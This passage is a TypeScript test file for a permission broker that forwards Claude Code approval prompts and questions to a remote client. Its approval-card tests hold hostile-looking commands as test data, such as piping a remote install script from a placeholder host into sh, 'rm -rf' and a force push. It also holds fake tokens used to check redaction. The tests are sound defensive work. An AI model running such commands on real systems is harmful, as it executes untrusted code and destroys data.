// 6.52.0: the permission broker's rules, executed. The HTTP doors and the real hook script
// are in routes/permission-broker.test.ts and cos-session-hook.script.test.ts.
import { readFileSync } from 'node:fs'
import { afterEach, describe, expect, it } from 'vitest'

import {
  redactApprovalText,
  APPROVAL_DETAIL_MAX,
  APPROVAL_EMPTY_COMMAND,
  APPROVAL_EMPTY_PATH,
  APPROVAL_NO_INPUT,
  APPROVAL_SUMMARY_MAX,
  BROKER_TIMEOUT_MAX_S,
  CLIENT_LIVE_WINDOW_MS,
  DENY_MESSAGE,
  DESK_IDLE_MIN_S,
  AWAY_HOLD_DEFAULT_S,
  AWAY_RECENT_CLIENT_DEFAULT_S,
  HOOK_CURL_MAX_S,
  LEGACY_HOOK_WAIT_S,
  AWAY_MIN_CEILING_S,
  MAC_WAIT_MAX_RETENTION_MS,
  MAC_WAIT_RETENTION_MS,
  MAX_PENDING,
  SETTLED_LIST_MAX,
  SETTLED_RETENTION_MS,
  POLL_FUTURE_SKEW_MS,
  PermissionBroker,
  approvalCard,
  approvalCutMarker,
  approvalHookOutput,
  brokerSignalSink,
  cancelHookOutput,
  parsePermissionRequestEnvelope,
  parseQuestions,
  permissionBrokerHealthFields,
  holdCeilingS,
  permissionBrokerAwayHoldMs,
  permissionBrokerAwayRecentClientMs,
  permissionBrokerMode,
  permissionBrokerTimeoutMs,
  questionHookOutput,
  readHidIdleSeconds,
  registerPermissionBroker,
  sessionQuestionsCapability,
  validateQuestionAnswers,
  wirePermissionBrokerToSignals,
  type BrokerMode,
  type HookReplyChannel,
  type PermissionBrokerDeps,
} from './permission-broker.js'
import { SessionSignalStore } from './session-signal-store.js'
import { deriveSessionState, derivedRowFields } from './session-state-derive.js'
import { toolFingerprint, type HookEnvelope } from './session-hook-events.js'
import { PRESENCE_AGE_MAX_MS, __resetClientLivenessForTests, lastHoldQuestionsPollAt, lastLegacyQuestionsPollAt, lastQuestionsPollAt, monotonicNowMs, noteQuestionsPoll, presenceAgeMs, validPresenceAgeMs } from './client-liveness.js'
import { REDACTION_SCAN_MAX_CHARS } from './activity-preview.js'
import { HOOK_SUBSCRIPTIONS, LEGACY_PERMISSION_HOOK_TIMEOUT_S, PERMISSION_HOOK_TIMEOUT_S } from './claude-hooks-installer.js'
import { PERMISSION_BROKER_HOOK_PATH } from '../routes/permission-broker.js'

import { ASK_INPUT, Q1, Q2, QUESTIONS, SESSION, permissionEnvelope } from './__fixtures__/permission-broker.js'

function hookEvent(event: HookEnvelope['event'], ts: number, payload: Record<string, unknown> = {}): HookEnvelope {
  return { ts, ppid: 4242, event, sessionId: SESSION, payload: { session_id: SESSION, ...payload } }
}

/** A held response that records what it was sent. `open` false models a half-dead socket. */
function fakeChannel(open = true) {
  const sent: Array<Record<string, unknown>> = []
  const channel: HookReplyChannel & { open: boolean } = {
    open,
    writable() { return this.open },
    // A write into a socket that is going away is still ACCEPTED by Node: that is the hazard.
    reply(body) { sent.push(body); return true },
  }
  return { channel, sent }
}

function brokerWith(over: Partial<PermissionBrokerDeps> = {}, state: { now?: number; mode?: BrokerMode; idle?: number | null; seenAt?: number | null } = {}) {
  const clock = { now: state.now ?? 1_000_000 }
  const s = { mode: state.mode ?? 'all' as BrokerMode, idle: state.idle === undefined ? 1_000 : state.idle, seenAt: state.seenAt === undefined ? clock.now : state.seenAt, admissions: true, idleReads: 0 }
  let n = 0
  const broker = new PermissionBroker({
    now: () => clock.now,
    mode: () => s.mode,
    admissionsOpen: () => s.admissions,
    lastQuestionsPollAt: () => s.seenAt,
    readDeskIdleSeconds: async () => { s.idleReads++; return s.idle },
    deskIdleSeconds: () => 90,
    timeoutMs: () => 110_000,
    pollMs: 60_000,
    newId: () => `pq_${String(++n).padStart(24, '0')}`,
    log: () => {},
    ...over,
  })
  return { broker, clock, s }
}

const brokers: PermissionBroker[] = []
afterEach(() => { for (const b of brokers.splice(0)) b.stop(); registerPermissionBroker(null) })

describe('configuration', () => {
  it('COS_PERMISSION_BROKER: 0/false/off is the kill switch, questions narrows, anything else is both; hooks off is off', () => {
    for (const off of ['0', 'false', 'off', ' OFF ']) expect(permissionBrokerMode({ COS_PERMISSION_BROKER: off }, true)).toBe('off')
    expect(permissionBrokerMode({ COS_PERMISSION_BROKER: 'questions' }, true)).toBe('questions')
    for (const on of [undefined, '', '1', 'true', 'on', 'all', 'typo']) expect(permissionBrokerMode({ COS_PERMISSION_BROKER: on }, true)).toBe('all')
    expect(permissionBrokerMode({}, false)).toBe('off')
    expect(permissionBrokerMode({ COS_PERMISSION_BROKER: '1' }, false)).toBe('off')
  })

  it('the deadline defaults to 110 s and is never at or above the hook\'s 125 s', () => {
    expect(permissionBrokerTimeoutMs({})).toBe(110_000)
    for (const junk of ['', '0', '-5', 'abc', 'NaN', 'Infinity']) expect(permissionBrokerTimeoutMs({ COS_PERMISSION_BROKER_TIMEOUT_S: junk })).toBe(110_000)
    expect(permissionBrokerTimeoutMs({ COS_PERMISSION_BROKER_TIMEOUT_S: '30' })).toBe(30_000)
    expect(permissionBrokerTimeoutMs({ COS_PERMISSION_BROKER_TIMEOUT_S: '1' })).toBe(5_000)
    for (const high of ['120', '124.9', '125', '130', '600', '1e9']) {
      const ms = permissionBrokerTimeoutMs({ COS_PERMISSION_BROKER_TIMEOUT_S: high })
      expect(ms).toBe(BROKER_TIMEOUT_MAX_S * 1000)
      expect(ms).toBeLessThan(HOOK_CURL_MAX_S * 1000)
    }
  })
})

describe('timeout parity: broker deadline < the script\'s curl < Claude Code\'s hook timeout', () => {
  it('reads the real script and the real installer, and orders the three, for the 6.60.0 hook and the earlier one', () => {
    const script = readFileSync(new URL('../../bin/hooks/cos-session-hook', import.meta.url), 'utf8')
    // The curl that posts the PermissionRequest to the broker (the script's other curl is
    // the Cursor Stop one, with its own 3 s). 6.60.0: it gives up 5 s before the wait the
    // installer passed as $2, and an invocation with no usable $2 waits the earlier 130.
    const curl = new RegExp(String.raw`--max-time \$\(\(WAIT - (\d+)\)\)[^\n]*\\\n[^\n]*"http://127\.0\.0\.1:\$PORT` + PERMISSION_BROKER_HOOK_PATH.replace(/\//g, '\\/') + '"').exec(script)
    expect(curl, 'the PermissionRequest curl line').not.toBeNull()
    const curlMarginS = Number(curl![1])
    const legacyWait = /^WAIT=(\d+); STAMP_WAIT=''$/m.exec(script)
    expect(legacyWait, 'the default wait').not.toBeNull()
    expect(Number(legacyWait![1])).toBe(LEGACY_HOOK_WAIT_S)
    expect(LEGACY_HOOK_WAIT_S - curlMarginS).toBe(HOOK_CURL_MAX_S)

    const sub = HOOK_SUBSCRIPTIONS.find(entry => entry.event === 'PermissionRequest')!
    expect(sub).toMatchObject({ async: false, timeout: PERMISSION_HOOK_TIMEOUT_S, passTimeout: true })
    expect(PERMISSION_HOOK_TIMEOUT_S).toBe(630)

    // The 6.60.0 hook: the broker answers by 620, curl gives up at 625, Claude at 630.
    const ceilingNew = holdCeilingS(PERMISSION_HOOK_TIMEOUT_S, PERMISSION_HOOK_TIMEOUT_S)
    expect(ceilingNew).toBeLessThan(PERMISSION_HOOK_TIMEOUT_S - curlMarginS)
    expect(PERMISSION_HOOK_TIMEOUT_S - curlMarginS).toBeLessThan(PERMISSION_HOOK_TIMEOUT_S)
    // The longest away hold fits inside it.
    expect(permissionBrokerAwayHoldMs({ COS_PERMISSION_BROKER_AWAY_HOLD_S: '1e9' })).toBeLessThanOrEqual(ceilingNew * 1000)
    // The earlier hook: 120, 125, 130, as every release since 6.52.0.
    expect(holdCeilingS(LEGACY_PERMISSION_HOOK_TIMEOUT_S, null)).toBe(BROKER_TIMEOUT_MAX_S)
    expect(permissionBrokerTimeoutMs({ COS_PERMISSION_BROKER_TIMEOUT_S: '1e9' })).toBe(BROKER_TIMEOUT_MAX_S * 1000)
    expect(BROKER_TIMEOUT_MAX_S).toBeLessThan(HOOK_CURL_MAX_S)
    expect(HOOK_CURL_MAX_S).toBeLessThan(LEGACY_PERMISSION_HOOK_TIMEOUT_S)
  })
})

describe('the liveness signal (lib/client-liveness)', () => {
  it('records the newest questions poll and never moves backwards', () => {
    __resetClientLivenessForTests()
    expect(lastQuestionsPollAt()).toBeNull()
    noteQuestionsPoll(Number.NaN)
    expect(lastQuestionsPollAt()).toBeNull()
    noteQuestionsPoll(5_000)
    noteQuestionsPoll(4_000) // a slower request answered later with an older stamp
    expect(lastQuestionsPollAt()).toBe(5_000)
    noteQuestionsPoll(6_000)
    expect(lastQuestionsPollAt()).toBe(6_000)
    // A clock that stepped back is followed, or no poll would count until it caught up.
    noteQuestionsPoll(6_000 - 5_001)
    expect(lastQuestionsPollAt()).toBe(999)
    __resetClientLivenessForTests()
  })

  it('6.60.0: only a hold=1 poll with valid presence records presence; older polls stay the 6.59.0 liveness', () => {
    __resetClientLivenessForTests()
    // An older client: liveness as before, no presence at all.
    noteQuestionsPoll(1_000_000, {}, 10_000)
    expect(lastLegacyQuestionsPollAt()).toBe(1_000_000)
    expect(lastHoldQuestionsPollAt()).toBeNull()
    expect(presenceAgeMs(10_000, 1_000_000)).toBeNull()
    // A 6.9.563 lens nobody wears: hold=1, no presenceAgeMs. A hold poll, no presence.
    noteQuestionsPoll(1_000_500, { hold: true, presenceAgeMs: null }, 10_500)
    expect(lastHoldQuestionsPollAt()).toBe(1_000_500)
    expect(lastLegacyQuestionsPollAt()).toBe(1_000_000)
    expect(presenceAgeMs(10_500, 1_000_500)).toBeNull()
    // presenceAgeMs without hold=1 never counts.
    noteQuestionsPoll(1_000_600, { presenceAgeMs: 0 }, 10_600)
    expect(presenceAgeMs(10_600, 1_000_600)).toBeNull()
    expect(lastQuestionsPollAt()).toBe(1_000_600)
    // Out of the contract: no presence.
    for (const bad of [-1, 1.5, PRESENCE_AGE_MAX_MS + 1, Number.NaN, Infinity]) {
      expect(validPresenceAgeMs(bad), String(bad)).toBe(false)
      noteQuestionsPoll(1_000_700, { hold: true, presenceAgeMs: bad }, 10_700)
    }
    expect(presenceAgeMs(10_700, 1_000_700)).toBeNull()
    expect(validPresenceAgeMs(0)).toBe(true)
    expect(validPresenceAgeMs(PRESENCE_AGE_MAX_MS)).toBe(true)
    __resetClientLivenessForTests()
  })

  it('6.60.0: presence age is the larger of the monotonic and wall ages, forward-only, and a restart forgets it', () => {
    __resetClientLivenessForTests()
    expect(presenceAgeMs(10_000, 1_000_000)).toBeNull()
    // Worn 2 s before this poll.
    noteQuestionsPoll(1_000_000, { hold: true, presenceAgeMs: 2_000 }, 10_000)
    expect(presenceAgeMs(10_500, 1_000_500)).toBe(2_500)
    // A slower poll carrying older evidence never moves it back.
    noteQuestionsPoll(1_000_600, { hold: true, presenceAgeMs: 60_000 }, 10_600)
    expect(presenceAgeMs(10_600, 1_000_600)).toBe(2_600)
    // The Mac slept an hour: the monotonic clock paused (+0.1 s), the wall clock did not.
    expect(presenceAgeMs(10_700, 1_000_600 + 3_600_000)).toBe(3_602_600)
    // The wall clock stepped back an hour: the monotonic age still holds it.
    expect(presenceAgeMs(10_700, 1_000_600 - 3_600_000)).toBe(2_700)
    // Newer evidence moves it forward.
    noteQuestionsPoll(1_000_800, { hold: true, presenceAgeMs: 0 }, 10_800)
    expect(presenceAgeMs(10_900, 1_000_900)).toBe(100)
    // The real clocks: just worn is about zero.
    __resetClientLivenessForTests()
    noteQuestionsPoll(Date.now(), { hold: true, presenceAgeMs: 0 })
    expect(presenceAgeMs()).toBeLessThan(1_000)
    expect(monotonicNowMs()).toBeGreaterThan(0)
    __resetClientLivenessForTests()
    expect(presenceAgeMs()).toBeNull()
  })

  it('a stamp more than 5 s in the future is stale, not live forever', async () => {
    const { broker, s, clock } = brokerWith()
    brokers.push(broker)
    s.seenAt = clock.now + POLL_FUTURE_SKEW_MS
    expect((await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).ok).toBe(true)
    s.seenAt = clock.now + POLL_FUTURE_SKEW_MS + 1
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'no_client' })
  })

  it('a poll exactly 30 s old still counts; one millisecond more does not', async () => {
    expect(CLIENT_LIVE_WINDOW_MS).toBe(30_000)
    const { broker, s, clock } = brokerWith()
    brokers.push(broker)
    s.seenAt = clock.now - CLIENT_LIVE_WINDOW_MS
    expect((await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).ok).toBe(true)
    s.seenAt = clock.now - CLIENT_LIVE_WINDOW_MS - 1
    expect(await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    s.seenAt = null
    expect(await broker.admit(permissionEnvelope('AskUserQuestion', ASK_INPUT, {}, clock.now))).toEqual({ ok: false, reason: 'no_client' })
  })
})

describe('reading the envelope', () => {
  it('reads a Claude PermissionRequest, the tool input verbatim, and the reducer\'s fingerprint', () => {
    const verdict = parsePermissionRequestEnvelope(permissionEnvelope('AskUserQuestion', ASK_INPUT, {}, 5_000))
    expect(verdict.ok).toBe(true)
    if (!verdict.ok) return
    expect(verdict.facts).toEqual({ sessionId: SESSION, toolName: 'AskUserQuestion', toolInput: ASK_INPUT, fingerprint: toolFingerprint('AskUserQuestion', ASK_INPUT), hookStartedAtMs: 5_000, hookWaitS: null })
  })

  it('6.60.0: reads the hook\'s wait stamp only as a whole number of seconds the installer could write', () => {
    const wait = (hookWaitS: unknown) => {
      const verdict = parsePermissionRequestEnvelope({ ...permissionEnvelope('Bash', { command: 'ls' }, {}, 5_000), hookWaitS })
      if (!verdict.ok) throw new Error(verdict.reason)
      return verdict.facts.hookWaitS
    }
    expect(wait(630)).toBe(630)
    expect(wait(3_600)).toBe(3_600)
    for (const junk of [undefined, null, '630', 630.5, 0, -1, 3_601, Number.NaN, Infinity, [630]]) expect(wait(junk), String(junk)).toBeNull()
  })

  it('a Cursor payload is Cursor in any form; junk is malformed', () => {
    for (const v of ['3.21.13', '', null, 3]) {
      expect(parsePermissionRequestEnvelope(permissionEnvelope('Bash', { command: 'ls' }, { cursor_version: v }))).toEqual({ ok: false, reason: 'cursor' })
    }
    const bad = [
      null, 'x', [], {}, { event: 'PermissionRequest' }, { ...permissionEnvelope('Bash', { command: 'ls' }), event: 'Stop' },
      permissionEnvelope('Bash', { command: 'ls' }, { session_id: '../x' }),
      permissionEnvelope('', { command: 'ls' }),
      permissionEnvelope('Bash', { command: 'ls' }, { tool_input: 'ls' }),
    ]
    for (const b of bad) expect(parsePermissionRequestEnvelope(b)).toEqual({ ok: false, reason: 'malformed' })
    const unstamped = parsePermissionRequestEnvelope(permissionEnvelope('Bash', { command: 'ls' }, {}, 'soon'))
    expect(unstamped.ok && unstamped.facts.hookStartedAtMs).toBeNull()
  })

  it('reads the question card strictly', () => {
    expect(parseQuestions(ASK_INPUT)).toEqual(QUESTIONS)
    expect(parseQuestions({ questions: [{ question: 'Q?', options: [{ label: 'A' }] }] })).toEqual([{ question: 'Q?', header: '', multiSelect: false, options: [{ label: 'A', description: '' }] }])
    for (const bad of [
      {}, { questions: [] }, { questions: 'x' },
      { questions: [{ question: '', options: [{ label: 'A' }] }] },
      { questions: [{ question: 'Q', options: [] }] },
      { questions: [{ question: 'Q', options: [{ label: '' }] }] },
      { questions: [{ question: 'Q', options: [{ label: 'A' }] }, { question: 'Q', options: [{ label: 'B' }] }] },
    ]) expect(parseQuestions(bad as Record<string, unknown>)).toBeNull()
  })

  it('a question whose options share a label is never held: {} on the fast path, counted as unsupported_input (app QA)', async () => {
    const twins = { questions: [{ question: 'Deploy where?', header: 'Target', multiSelect: true, options: [{ label: 'Prod', description: 'us-east' }, { label: 'Prod', description: 'eu-west' }] }] }
    // An answer names an option by its label: the two can never be told apart.
    expect(parseQuestions(twins)).toBeNull()
    // Labels that only look alike are different options, and the card is held.
    const near = { questions: [{ question: 'Deploy where?', options: [{ label: 'Prod' }, { label: 'prod' }, { label: 'Prod ' }] }] }
    expect(parseQuestions(near)?.[0]?.options.map(o => o.label)).toEqual(['Prod', 'prod', 'Prod '])
    // The same label in two DIFFERENT questions is fine: answers are keyed per question.
    expect(parseQuestions({ questions: [{ question: 'A?', options: [{ label: 'Yes' }] }, { question: 'B?', options: [{ label: 'Yes' }] }] })).not.toBeNull()

    const { broker, clock } = brokerWith()
    brokers.push(broker)
    expect(await broker.admit(permissionEnvelope('AskUserQuestion', twins, {}, clock.now))).toEqual({ ok: false, reason: 'unsupported_input' })
    // One label repeated inside a LATER question of the card refuses the whole card.
    const later = { questions: [QUESTIONS[0], { question: 'Color?', options: [{ label: 'Blue' }, { label: 'Blue' }] }] }
    expect(await broker.admit(permissionEnvelope('AskUserQuestion', later, {}, clock.now))).toEqual({ ok: false, reason: 'unsupported_input' })
    expect(broker.health().counters.fastPath).toEqual({ unsupportedInput: 2 })
    expect(broker.health().counters.parked).toBe(0)
    expect(broker.list()).toEqual([])
    // The control: the same card with distinct labels is held.
    expect((await broker.admit(permissionEnvelope('AskUserQuestion', near, {}, clock.now))).ok).toBe(true)
  })
})

describe('answers', () => {
  it('keys each list by the ORIGINAL question text, labels in option order, Other verbatim and last', () => {
    const v = validateQuestionAnswers(QUESTIONS, [{ labels: ['Publish', 'Bump'], other: '  also notify Gina ' }, { labels: ['Blue'] }])
    expect(v).toEqual({ ok: true, answers: { [Q1]: ['Bump', 'Publish', '  also notify Gina '], [Q2]: ['Blue'] } })
    // Other alone answers a single-select question.
    expect(validateQuestionAnswers(QUESTIONS, [{ labels: ['Tag'] }, { other: 'Green' }])).toEqual({ ok: true, answers: { [Q1]: ['Tag'], [Q2]: ['Green'] } })
  })

  it('free text with a comma is quoted, so the model reads it as ONE answer (canary 2026-09-19)', () => {
    const colors = [{ question: 'Colors?', header: 'Colors', multiSelect: true, options: [{ label: 'Red', description: '' }, { label: 'Blue', description: '' }, { label: 'Green, dark', description: '' }] }]
    // Claude Code joins the list with commas: "Red,Blue,Purple, but only on weekends" lost its clause.
    expect(validateQuestionAnswers(colors, [{ labels: ['Red', 'Blue'], other: 'Purple, but only on weekends' }]))
      .toEqual({ ok: true, answers: { 'Colors?': ['Red', 'Blue', '"Purple, but only on weekends"'] } })
    // A label is never touched, even one with a comma; free text without a comma is as written.
    expect(validateQuestionAnswers(colors, [{ labels: ['Green, dark'], other: 'Purple' }]))
      .toEqual({ ok: true, answers: { 'Colors?': ['Green, dark', 'Purple'] } })
  })

  it('refuses what cannot be sent', () => {
    const cases: Array<[unknown, string, number | undefined]> = [
      [undefined, 'answers_shape', undefined],
      [[{ labels: ['Bump'] }], 'answers_shape', undefined],
      [[{ labels: 'Bump' }, { labels: ['Blue'] }], 'answers_shape', 0],
      [[{ labels: ['Bump'] }, 'Blue'], 'answers_shape', 1],
      [[{ labels: ['Bump'] }, { labels: [], other: 7 }], 'answers_shape', 1],
      [[{ labels: ['bump'] }, { labels: ['Blue'] }], 'unknown_label', 0],
      [[{ labels: ['Bump', 'Bump'] }, { labels: ['Blue'] }], 'duplicate_label', 0],
      [[{ labels: ['Bump'] }, { labels: [] }], 'unanswered', 1],
      [[{ labels: ['Bump'] }, { other: '   ' }], 'unanswered', 1],
      [[{ labels: ['Bump'] }, { labels: ['Blue', 'Red'] }], 'too_many', 1],
      [[{ labels: ['Bump'] }, { labels: ['Blue'], other: 'Green' }], 'too_many', 1],
      [[{ labels: ['Bump'] }, { other: 'x'.repeat(2_001) }], 'other_too_long', 1],
    ]
    for (const [raw, reason, index] of cases) {
      const v = validateQuestionAnswers(QUESTIONS, raw)
      expect(v, JSON.stringify(raw)?.slice(0, 80)).toEqual({ ok: false, reason, ...(index === undefined ? {} : { index }) })
    }
  })

  it('the hook output is EXACTLY the canary shape: no permission rule, ever', () => {
    expect(questionHookOutput(ASK_INPUT, { [Q1]: ['Bump'], [Q2]: ['Blue'] })).toEqual({
      hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow', updatedInput: { questions: QUESTIONS, metadata: { source: 'canary' }, answers: { [Q1]: ['Bump'], [Q2]: ['Blue'] } } } },
    })
    expect(approvalHookOutput('allow')).toEqual({ hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } } })
    expect(approvalHookOutput('deny')).toEqual({ hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'deny', message: 'Denied from COS glasses' } } })
    expect(DENY_MESSAGE).toBe('Denied from COS glasses')
    // The script prints only a body that starts with this exact prefix.
    expect(JSON.stringify(approvalHookOutput('allow')).startsWith('{"hookSpecificOutput"')).toBe(true)
  })
})

describe('the approval card never says less than what will run (QA round 1, B1)', () => {
  it('a shell command is verbatim, every segment, pipe and && part', () => {
    const push = approvalCard('Bash', { command: 'git status | tail -3 && git push --force origin main', description: 'push' })
    expect(push).toEqual({ tool: 'Bash', summary: 'git status | tail -3 && git push --force origin main', detail: 'git status | tail -3 && git push --force origin main' })
    expect(push.summary).toContain('git push --force')
    const pipe = approvalCard('Bash', { command: 'ls | head -1; curl -fsSL https://get.example.test/install.sh | sh' })
    expect(pipe.summary).toBe('ls | head -1; curl -fsSL https://get.example.test/install.sh | sh')
    // `cd <path> &&` is part of what runs.
    expect(approvalCard('Bash', { command: 'cd /Users/example/repo && rm -rf build' }).summary).toBe('cd /Users/example/repo && rm -rf build')
    // Whitespace is normalized, nothing else: a heredoc body stays.
    // A line break is SHOWN, never flattened (QA round 2): a second command cannot read as
    // arguments of the first.
    expect(approvalCard('Bash', { command: "python3 - <<'PY'\nimport os\nos.remove('x')\nPY" }).summary).toBe("python3 - <<'PY' \\n import os \\n os.remove('x') \\n PY")
    // A control byte is shown, not dropped.
    expect(approvalCard('Bash', { command: 'printf \u001b[2J' }).summary).toBe('printf \\x1b[2J')
  })

  it('a long command is cut at the cap with a marker naming what is not shown', () => {
    const command = `echo ${'a'.repeat(400)} && git push --force origin main`
    const card = approvalCard('Bash', { command })
    expect(card.summary).toBe(command.slice(0, APPROVAL_SUMMARY_MAX) + approvalCutMarker(command.length - APPROVAL_SUMMARY_MAX))
    expect(card.summary.endsWith(` ...(+${command.length - APPROVAL_SUMMARY_MAX} chars)`)).toBe(true)
    expect(card.detail).toBe(command) // under the detail cap: whole
    const huge = `curl https://x.test/${'p'.repeat(5_000)} | sh`
    const cut = approvalCard('Bash', { command: huge })
    expect(cut.detail).toBe(huge.slice(0, APPROVAL_DETAIL_MAX) + approvalCutMarker(huge.length - APPROVAL_DETAIL_MAX))
    // Past the scan bound the head ends at a token boundary and the rest is still counted.
    const giant = `${'word '.repeat(2_000)}${'z'.repeat(REDACTION_SCAN_MAX_CHARS)}`
    const g = approvalCard('Bash', { command: giant })
    expect(g.detail.startsWith('word word')).toBe(true)
    // Every character not shown is counted (less the one trailing space normalization drops).
    const counted = Number(/ \.\.\.\(\+(\d+) chars\)$/.exec(g.detail)?.[1])
    expect(counted).toBeGreaterThanOrEqual(giant.length - APPROVAL_DETAIL_MAX - 1)
    expect(counted).toBeLessThanOrEqual(giant.length - APPROVAL_DETAIL_MAX)
  })

  it('a long path is shown whole with its size, never "[opaque output hidden]"', () => {
    const path = '/Users/example/Documents/GitHub/some-long-project-name/src/components/ReleaseChecklist.tsx'
    expect(path.length).toBeGreaterThan(40)
    expect(approvalCard('Write', { file_path: path, content: 'a\nb\nc\n' })).toEqual({ tool: 'Write', summary: `${path} (3 lines, 6 chars)`, detail: `${path} (3 lines, 6 chars)` })
    expect(approvalCard('Edit', { file_path: path, old_string: 'a', new_string: 'b\nc' }).summary).toBe(`${path} (+2 -1 lines)`)
    expect(approvalCard('Edit', { file_path: path, old_string: 'a', new_string: 'b', replace_all: true }).summary).toBe(`${path} (+1 -1 lines, every match)`)
    expect(approvalCard('NotebookEdit', { notebook_path: '/Users/example/n.ipynb', new_source: 'x = 1\ny = 2', edit_mode: 'insert' }).summary).toBe('/Users/example/n.ipynb (insert, 2 lines)')
    // A hash-like argument is shown too: only secrets are taken out.
    const sha = '3f1c9a7e5b2d4c6a8e0f1b3d5c7a9e2f4b6d8c0a'
    expect(approvalCard('Bash', { command: `git checkout ${sha}` }).summary).toBe(`git checkout ${sha}`)
  })

  it('WebFetch shows the URL, WebSearch the query, anything else its keys and values', () => {
    expect(approvalCard('WebFetch', { url: 'https://docs.example.test/page', prompt: 'summarize it' })).toMatchObject({ summary: 'https://docs.example.test/page' })
    expect(approvalCard('WebFetch', { url: 'https://user:pw@example.com/x', prompt: 'x' }).summary).not.toContain('user:pw')
    expect(approvalCard('WebSearch', { query: 'claude code hooks' }).summary).toBe('claude code hooks')
    const mcp = approvalCard('mcp__slack__send_message', { channel: 'C0123', text: 'Ship it', thread: { ts: '1.2' } })
    expect(mcp).toEqual({ tool: 'mcp__slack__send_message', summary: 'channel=C0123 text=Ship it thread={"ts":"1.2"}', detail: 'channel=C0123 text=Ship it thread={"ts":"1.2"}' })
    const many = approvalCard('SomeTool', Object.fromEntries(Array.from({ length: 20 }, (_, i) => [`key${i}`, 'v'.repeat(20)])))
    expect(many.summary.startsWith('key0=vvvv')).toBe(true)
    expect(many.summary).toMatch(/ \.\.\.\(\+\d+ chars\)$/)
  })

  it('redacts secrets (and only secrets) before it cuts: never half shown', () => {
    const card = approvalCard('Bash', { command: 'curl -H "Authorization: Bearer abcdefghijklmnop" https://x.test/api?token=s3cr3tvalue | head -5' })
    expect(card.summary).toContain('curl -H')
    expect(card.summary).toContain('| head -5')
    for (const secret of ['abcdefghijklmnop', 's3cr3tvalue']) {
      expect(card.summary).not.toContain(secret)
      expect(card.detail).not.toContain(secret)
    }
    // A key straddling the summary cap is redacted whole, not cut into a prefix.
    const straddle = approvalCard('Bash', { command: `echo ${'x'.repeat(APPROVAL_SUMMARY_MAX - 10)} AKIAABCDEFGHIJKLMNOP` })
    expect(straddle.summary).not.toMatch(/AKIA[A-Z]/)
    expect(straddle.detail).toContain('[redacted-aws-key]')
  })
})

describe('the broker, driven directly', () => {
  it('an answer is accepted only while the hook can take it: a socket that cannot is hook_gone, and nothing is written', async () => {
    const { broker } = brokerWith()
    brokers.push(broker)
    const admission = await broker.admit(permissionEnvelope('Bash', { command: 'touch x' }, {}, 1_000_000))
    expect(admission.ok).toBe(true)
    if (!admission.ok) return
    const { channel, sent } = fakeChannel(true)
    const id = broker.park(admission.request, channel)
    channel.open = false // the hook left; the close has not been processed yet
    expect(broker.answer(id, { clientAnswerId: 'a1', decision: 'allow' })).toEqual({ status: 410, body: { error: 'hook_gone' } })
    expect(sent).toEqual([])
    expect(broker.health().counters).toMatchObject({ answered: 0, hookGone: 1 })
  })

  it('first answer wins; the same clientAnswerId replays; a close after the answer changes nothing', async () => {
    const { broker } = brokerWith()
    brokers.push(broker)
    const admission = await broker.admit(permissionEnvelope('Bash', { command: 'touch x' }, {}, 1_000_000))
    if (!admission.ok) throw new Error('not admitted')
    const { channel, sent } = fakeChannel(true)
    const id = broker.park(admission.request, channel)
    expect(broker.answer(id, { clientAnswerId: 'first', decision: 'deny' })).toEqual({ status: 200, body: { ok: true, id, kind: 'approval', decision: 'deny' } })
    broker.hookClosed(id) // the response finished, then the socket closed
    expect(broker.answer(id, { clientAnswerId: 'second', decision: 'allow' })).toEqual({ status: 409, body: { error: 'already_answered', decision: 'deny' } })
    expect(broker.answer(id, { clientAnswerId: 'first', decision: 'allow' })).toEqual({ status: 200, body: { ok: true, id, kind: 'approval', replay: true, decision: 'deny' } })
    expect(sent).toEqual([approvalHookOutput('deny')])
    expect(broker.health().counters).toMatchObject({ parked: 1, answered: 1, hookGone: 0 })
  })

  describe('6.53.0: a cancel from COS settles the session\'s held prompts', () => {
    const park = async (broker: PermissionBroker, now: number, tool: string, input: Record<string, unknown>, session = SESSION) => {
      const a = await broker.admit(permissionEnvelope(tool, input, { session_id: session }, now))
      if (!a.ok) throw new Error(a.reason)
      const c = fakeChannel(true)
      return { id: broker.park(a.request, c.channel), ...c }
    }

    it('denies every held prompt of THAT session with interrupt, leaves other sessions, and records an answer', async () => {
      const { broker, clock } = brokerWith()
      brokers.push(broker)
      const other = 'b2c3d4e5-0000-4000-8000-00000000beef'
      const approval = await park(broker, clock.now, 'Bash', { command: 'rm -rf build' })
      const question = await park(broker, clock.now, 'AskUserQuestion', ASK_INPUT)
      const elsewhere = await park(broker, clock.now, 'Bash', { command: 'ls' }, other)
      expect(broker.cancelSession(SESSION.toUpperCase())).toBe(2)
      expect(approval.sent).toEqual([cancelHookOutput()])
      expect(question.sent).toEqual([cancelHookOutput()])
      expect(cancelHookOutput()).toEqual({ hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'deny', message: 'Cancelled from COS', interrupt: true } } })
      expect(elsewhere.sent).toEqual([])
      expect(broker.list().map(v => v.id)).toEqual([elsewhere.id])
      // A lens answering the card afterwards is told it was decided.
      expect(broker.answer(approval.id, { clientAnswerId: 'late-1', decision: 'allow' })).toEqual({ status: 409, body: { error: 'already_answered', decision: 'deny' } })
      expect(broker.health().counters).toMatchObject({ answered: 2 })
      // Nothing left to cancel for the session: zero, and nothing sent twice.
      expect(broker.cancelSession(SESSION)).toBe(0)
      expect(approval.sent).toHaveLength(1)
    })

    it('a hook that already left is hook_gone, not counted as denied', async () => {
      const { broker, clock } = brokerWith()
      brokers.push(broker)
      const gone = await park(broker, clock.now, 'Bash', { command: 'touch x' })
      gone.channel.open = false
      expect(broker.cancelSession(SESSION)).toBe(0)
      expect(gone.sent).toEqual([])
      expect(broker.health().counters).toMatchObject({ answered: 0, hookGone: 1 })
    })
  })

  describe('app QA: "Leave for the Mac" (handBack)', () => {
    const park = async (broker: PermissionBroker, now: number, tool = 'AskUserQuestion', input: Record<string, unknown> = ASK_INPUT) => {
      const a = await broker.admit(permissionEnvelope(tool, input, {}, now))
      if (!a.ok) throw new Error(a.reason)
